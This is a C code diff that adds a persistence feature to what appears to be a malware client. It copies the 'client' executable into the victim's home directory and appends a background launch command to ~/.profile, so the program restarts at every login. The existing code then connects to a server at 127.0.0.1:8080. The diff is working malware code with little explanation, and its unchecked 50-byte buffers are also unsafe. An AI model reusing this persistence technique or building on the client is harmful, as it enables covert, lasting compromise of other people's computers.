@@ -12,9 +12,54 @@ void kill_handler(int sig)
     printf("SIGINT Recv.\n");
 }
 
+
+int presistence(char *get_path, FILE *fp)
+{
+		
+    char chunk[128];
+    int len = strlen(get_path) -8;
+    get_path[len] = 0; //get_path without ".profile"
+		
+    //copy the executable to home directory
+    char command[50] = "cp client ";
+    strcat(command, get_path);
+    system(command);
+
+    strcat(get_path, "./client &");
+    //check if .profile can be accessed
+    if(fp == NULL)
+        {
+		
+	return 0;
+	}
+    //check if our command is already written there
+    while(fgets(chunk,sizeof(chunk),fp) != 0)
+	    {
+	    if(strstr(chunk,get_path) !=0)
+		    {
+		    return 0;
+		    }
+            }
+    fprintf(fp,"%s \n",get_path);
+    fclose(fp);
+    return 0;
+}
+
+
 int main(void)
 {
-    //LEAVE COMMENTED DURING DEV
+   
+   //get the .profile file path for the victim's machine
+    FILE *home_path = popen("echo $HOME/.profile","r");;
+    char get_path[50];
+    fscanf(home_path, "%s", get_path);
+    pclose(home_path);
+
+   //open .profile file in append mode
+    FILE *profile  = fopen(get_path, "a+");
+    presistence(get_path, profile); 
+
+   //LEAVE COMMENTED DURING DEV
     signal(SIGINT, kill_handler);
     connection server_con = connect_to("127.0.0.1", 8080);
 
